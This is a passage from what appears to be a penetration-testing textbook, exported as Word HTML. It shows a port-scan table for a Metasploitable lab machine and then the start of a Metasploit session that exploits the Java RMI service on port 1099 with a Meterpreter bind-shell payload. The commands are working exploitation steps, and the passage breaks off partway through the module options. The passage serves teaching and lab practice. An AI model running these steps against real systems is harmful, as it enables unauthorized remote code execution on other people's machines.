style="margin-left:3.5000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >192.168.56.103:111</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=52  valign=top  style="width:31.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:2.5000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >[*]</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=54  valign=top  style="width:32.4000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=right  style="margin-right:3.5000pt;margin-left:0.0000pt;text-align:right;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >TCP</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=60  valign=top  style="width:36.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=center  style="margin-right:2.6000pt;margin-left:2.5500pt;text-align:center;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >OPEN</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=238  valign=top  style="width:142.8500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:3.5000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >192.168.56.103:139</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=52  valign=top  style="width:31.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:2.5000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >[*]</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=54  valign=top  style="width:32.4000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=right  style="margin-right:3.5000pt;margin-left:0.0000pt;text-align:right;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >TCP</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=60  valign=top  style="width:36.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=center  style="margin-right:2.6000pt;margin-left:2.5500pt;text-align:center;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >OPEN</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=238  valign=top  style="width:142.8500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:3.5000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >192.168.56.103:445</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=52  valign=top  style="width:31.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:2.5000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >[*]</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=54  valign=top  style="width:32.4000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=right  style="margin-right:3.5000pt;margin-left:0.0000pt;text-align:right;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >TCP</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=60  valign=top  style="width:36.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=center  style="margin-right:2.6000pt;margin-left:2.5500pt;text-align:center;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >OPEN</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=238  valign=top  style="width:142.8500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:3.5000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >192.168.56.103:512</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=52  valign=top  style="width:31.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:2.5000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >[*]</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=54  valign=top  style="width:32.4000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=right  style="margin-right:3.5000pt;margin-left:0.0000pt;text-align:right;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >TCP</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=60  valign=top  style="width:36.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=center  style="margin-right:2.6000pt;margin-left:2.5500pt;text-align:center;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >OPEN</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=238  valign=top  style="width:142.8500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:3.5000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >192.168.56.103:513</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=52  valign=top  style="width:31.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:2.5000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >[*]</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=54  valign=top  style="width:32.4000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=right  style="margin-right:3.5000pt;margin-left:0.0000pt;text-align:right;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >TCP</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=60  valign=top  style="width:36.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=center  style="margin-right:2.6000pt;margin-left:2.5500pt;text-align:center;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >OPEN</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=238  valign=top  style="width:142.8500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:3.5000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >192.168.56.103:514</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=52  valign=top  style="width:31.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:2.5000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >[*]</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=54  valign=top  style="width:32.4000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=right  style="margin-right:3.5000pt;margin-left:0.0000pt;text-align:right;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >TCP</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=60  valign=top  style="width:36.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=center  style="margin-right:2.6000pt;margin-left:2.5500pt;text-align:center;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >OPEN</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=238  valign=top  style="width:142.8500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:3.5000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >192.168.56.103:1099</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=52  valign=top  style="width:31.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:2.5000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >[*]</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=54  valign=top  style="width:32.4000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=right  style="margin-right:3.5000pt;margin-left:0.0000pt;text-align:right;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >TCP</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=60  valign=top  style="width:36.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=center  style="margin-right:2.6000pt;margin-left:2.5500pt;text-align:center;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >OPEN</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=238  valign=top  style="width:142.8500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:3.5000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >192.168.56.103:1524</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=52  valign=top  style="width:31.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:2.5000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >[*]</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=54  valign=top  style="width:32.4000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=right  style="margin-right:3.5000pt;margin-left:0.0000pt;text-align:right;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >TCP</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=60  valign=top  style="width:36.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=center  style="margin-right:2.6000pt;margin-left:2.5500pt;text-align:center;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >OPEN</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=238  valign=top  style="width:142.8500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:3.5000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >192.168.56.103:2049</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=52  valign=top  style="width:31.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:2.5000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >[*]</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=54  valign=top  style="width:32.4000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=right  style="margin-right:3.5000pt;margin-left:0.0000pt;text-align:right;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >TCP</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=60  valign=top  style="width:36.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=center  style="margin-right:2.6000pt;margin-left:2.5500pt;text-align:center;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >OPEN</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=238  valign=top  style="width:142.8500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:3.5000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >192.168.56.103:2121</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=52  valign=top  style="width:31.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:2.5000pt;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >[*]</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=54  valign=top  style="width:32.4000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=right  style="margin-right:3.5000pt;margin-left:0.0000pt;text-align:right;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >TCP</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=60  valign=top  style="width:36.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=center  style="margin-right:2.6000pt;margin-left:2.5500pt;text-align:center;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >OPEN</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=238  valign=top  style="width:142.8500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:3.5000pt;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >192.168.56.103:3306</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr></table><p class=MsoBodyText  style="margin-top:0.5500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-right:6.8000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >You can see that </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >RHOSTS</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.8000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >is set to the IP address of the vulnerable target, the Metasploitable machine. (This IP address may be different in your setup, <a name="_bookmark496" ></a>so adjust it accordingly.) The default value for number of ports to scan is the first 10,000 TCP ports. This machine has numerous services available, which makes it hard to choose which one to attack first. Usually, you would interrogate each service to try to determine</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section255" ><p class=MsoBodyText  style="margin-top:3.7500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >which vulnerabilities may be present, but we are going to skip this process and go straight to the fun stuff, exploitation. We are going to target the Java RMI service running on port 1099. Covering the Java RMI is outside the scope of this book, but suffice to know it&#8217;s a service for which we have an exploit available. Our exploit will load Java code over HTTP. The </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >exploit/multi/misc/java_rmi_server</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.9000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >module is used.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.4000pt;margin-right:52.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The following shows some output from our Metasploit session exploiting this vulnerability:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:12.0500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><a name="_bookmark497" ></a><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >msf &#62; use exploit/multi/misc/java_rmi_server</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:52.5000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >msf exploit(java_rmi_server) &#62; set RHOST 192.168.56.103 RHOST =&#62; 192.168.56.103</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >msf exploit(java_rmi_server) &#62; set PAYLOAD java/meterpreter/bind_tcp</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >PAYLOAD =&#62; java/meterpreter/bind_tcp</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >msf exploit(java_rmi_server) &#62; show options</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Module options (exploit/multi/misc/java_rmi_server):</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><table class=MsoNormalTable  border=0  cellspacing=0  style="border-collapse:collapse;width:472.7000pt;margin-left:11.2500pt;mso-table-layout-alt:fixed;border:none;mso-padding-alt:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;" ><tr style="height:13.5000pt;" ><td width=136  valign=top  style="width:81.6500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:24.0500pt;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >Name</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=203  valign=top  style="width:122.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.1500pt;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >Current Setting</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=119  valign=top  style="width:71.9500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >Required</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=328  valign=top  style="width:196.8000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >Description</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=136  valign=top  style="width:81.6500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:24.0500pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >----</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=203  valign=top  style="width:122.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.1500pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >---------------</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=119  valign=top  style="width:71.9500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >--------</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=328  valign=top  style="width:196.8000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >-----------</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=136  valign=top  style="width:81.6500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:24.0500pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >RHOST</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=203  valign=top  style="width:122.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt 